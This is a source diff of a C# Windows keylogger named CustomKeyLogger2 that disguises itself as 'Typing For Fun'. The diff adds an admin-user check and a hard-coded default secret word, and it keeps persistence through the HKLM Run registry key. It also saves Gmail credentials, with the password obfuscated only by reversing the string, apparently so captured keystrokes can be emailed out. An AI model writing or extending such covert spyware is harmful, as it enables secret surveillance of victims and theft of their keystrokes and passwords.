@@ -34,6 +34,8 @@ namespace CustomKeyLogger2
         public Form1()
         {
             InitializeComponent();
+
+            InitAdmin();
             
             InitStream();
 
@@ -44,6 +46,15 @@ namespace CustomKeyLogger2
             InitEmail();
 
             InitStartUp();
+        }
+
+        private void InitAdmin()
+        {
+            if (Properties.Settings.Default.Admin == "")
+            {
+                Properties.Settings.Default.Admin = Environment.UserName;
+                Save();
+            }
         }
 
         private void InitStream()
@@ -69,10 +80,16 @@ namespace CustomKeyLogger2
 
         private void InitSecretWord()
         {
+            if (Properties.Settings.Default.SecretWord == "")
+            {
+                Properties.Settings.Default.SecretWord = "35305053530505";
+                Save();
+            }
             secretWord = Properties.Settings.Default.SecretWord;
             txtScrtWrd.Text = secretWord;
 
-            if (secretWord.CompareTo("") == 0 || Properties.Settings.Default.AutoStart == false)
+            if (Properties.Settings.Default.AutoStart == false
+                && Environment.UserName == Properties.Settings.Default.Admin)
             {
                 this.ShowWindow();
                 this.btnStart.Enabled = true;
@@ -115,20 +132,23 @@ namespace CustomKeyLogger2
 
         private void InitStartUp()
         {
-            String StartmenuApp = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)
-                + "\\Programs\\Typing For Fun\\Typing For Fun.appref-ms";
-            String StartupPath = atmdir + "Typing For Fun.appref-ms";
-
-            if (File.Exists(StartmenuApp))
+            if (Environment.UserName == Properties.Settings.Default.Admin)
             {
-                if (!File.Exists(StartupPath)) File.Copy(StartmenuApp, StartupPath, true);
-                RegistryKey regKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                string result = (string)regKey.GetValue(Application.ProductName, "NotFound");
-                if (result != StartupPath)
+                String StartmenuApp = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)
+                    + "\\Programs\\Typing For Fun\\Typing For Fun.appref-ms";
+                String StartupPath = atmdir + "Typing For Fun.appref-ms";
+
+                if (File.Exists(StartmenuApp))
                 {
-                    if (result != "NotFound") regKey.DeleteValue(Application.ProductName);
-                    regKey.SetValue(Application.ProductName, StartupPath);
-                    regKey.Close();
+                    if (!File.Exists(StartupPath)) File.Copy(StartmenuApp, StartupPath, true);
+                    RegistryKey regKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    string result = (string)regKey.GetValue(Application.ProductName, "NotFound");
+                    if (result != StartupPath)
+                    {
+                        if (result != "NotFound") regKey.DeleteValue(Application.ProductName);
+                        regKey.SetValue(Application.ProductName, StartupPath);
+                        regKey.Close();
+                    }
                 }
             }
         }
@@ -140,6 +160,7 @@ namespace CustomKeyLogger2
             btnStop.Enabled = true;
             btnHide.Enabled = true;
             Properties.Settings.Default.AutoStart = true;
+            Save();
         }
 
         private void btnStop_Click(object sender, EventArgs e)
@@ -149,6 +170,7 @@ namespace CustomKeyLogger2
             btnStop.Enabled = false;
             btnHide.Enabled = false;
             Properties.Settings.Default.AutoStart = false;
+            Save();
         }
 
         public void KeyReaderr(IntPtr wParam, IntPtr lParam, bool ShiftMod, bool CapMod)
@@ -458,14 +480,22 @@ namespace CustomKeyLogger2
 
         private void btnSvScrtWrd_Click(object sender, EventArgs e)
         {
-            WriteSecretWord();
-            NotifySaved();
+            if (txtScrtWrd.Text == "")
+            {
+                MessageBox.Show("No Secret Word Entered!");
+            }
+            else
+            {
+                WriteSecretWord();
+                NotifySaved();
+            }
         }
 
         private void WriteSecretWord()
         {
             secretWord = txtScrtWrd.Text.Trim();
             Properties.Settings.Default.SecretWord = secretWord;
+            Save();
         }
 
         private void btnSaveKeyWord_Click(object sender, EventArgs e)
@@ -576,6 +606,7 @@ namespace CustomKeyLogger2
         private void btnSaveEmail_Click(object sender, EventArgs e)
         {
             Properties.Settings.Default.GMail = txtEmail.Text;
+            Save();
             SavePassword(txtPassWord.Text);
             NotifySaved();
         }
@@ -590,6 +621,7 @@ namespace CustomKeyLogger2
             Char[] gen = rawpass.ToCharArray();
             Array.Reverse(gen);
             Properties.Settings.Default.PW = new String(gen);
+            Save();
         }
 
         private String LoadPassword()
@@ -602,7 +634,7 @@ namespace CustomKeyLogger2
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
-            Properties.Settings.Default.Save();
+            Save();
         }
 
         private void timUnHide_Tick(object sender, EventArgs e)
@@ -623,6 +655,17 @@ namespace CustomKeyLogger2
                 link.TargetPath = atmdir;
                 link.Save();
             }
+        }
+
+        private void btnAdmin_Click(object sender, EventArgs e)
+        {
+            Properties.Settings.Default.Admin = "";
+            Save();
+        }
+
+        private void Save()
+        {
+            Properties.Settings.Default.Save();
         }
     }
 }
